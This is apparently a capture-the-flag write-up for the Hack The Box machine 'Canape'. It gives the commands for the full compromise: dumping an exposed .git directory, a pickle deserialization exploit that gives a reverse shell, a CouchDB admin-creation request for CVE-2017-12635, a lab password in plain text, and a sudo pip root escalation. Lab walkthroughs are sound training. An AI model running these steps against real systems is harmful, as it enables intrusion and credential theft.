# [Canape](https://app.hackthebox.com/machines/canape)

```bash
nmap -p- --min-rate 10000 10.10.10.70 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan here.

```bash
nmap -A -sC -sV -p80 10.10.10.70 -Pn
```

![alt text](img/image-3.png)

From this result, I can see `.git` directory.

While opening web application, I can see such an webpage.

![alt text](img/image-2.png)


Let's dump all data from `.git` directory from our target by using [git_dumper](https://github.com/arthaud/git-dumper).

```bash
python3 git_dumper.py http://10.10.10.70/.git/ /home/kali/Desktop/webapp
```

![alt text](img/image-1.png)


By looking at `__init__.py` script, I can see `cPickle` library.

![alt text](img/image-4.png)

I searched publicly known exploit and find [this](https://gist.github.com/Ge0rg3/e70e8197244f48bc14843ce738de78d4).

```bash
python2 exploit.py
```

![alt text](img/image-5.png)


I got reverse shell from port `1337`.

![alt text](img/image-6.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")';
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-7.png)


From `__init__.py` file, we can see that `CouchDB` is used.

![alt text](img/image-8.png)

If I run `netstat -ntpl` command, I can see port `5984` which runs `CouchDB`.

![alt text](img/image-9.png)


Let's enumerate `CouchDB`.

```bash
curl http://127.0.0.1:5984/
```

![alt text](img/image-10.png)

I use this [blog](https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb) of `Hacktricks` to make enumeration.


I just understand that this version of `CouchDB` is vulnerable to [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635). So we need to just make `PUT` request to endpoint to create  `admin` user.

```bash
curl -X PUT -d '{"type":"user","name":"dr4ks","roles":["_admin"],"roles":[],"password":"dr4ks"}' localhost:5984/_users/org.couchdb.user:dr4ks -H "Content-Type:application/json"
```

![alt text](img/image-11.png)


Now, we can enumerate `CouchDB` via `admin` user and I look at documents one by one. Below one give me password.
```bash
curl http://dr4ks:dr4ks@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
```

![alt text](img/image-12.png)


I can know password of `homer` user.

homer: 0B4jyA0xtytZi7esBNGp


Let's login into machine via `ssh` command but we need to specify port which we got from first nmap scan that is `65535`.
```bash
ssh -p 65535 homer@10.10.10.70
```


user.txt

![alt text](img/image-13.png)



For `Privilege Escalation` vector, I just run `sudo -l` command to see privileges of this user.

![alt text](img/image-14.png)


While I looking for privilege escalation attack for `pip`, I found on [Gtfobins](https://gtfobins.github.io/gtfobins/pip/#sudo).


```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

![alt text](img/image-15.png)


root.txt

![alt text](img/image-16.png)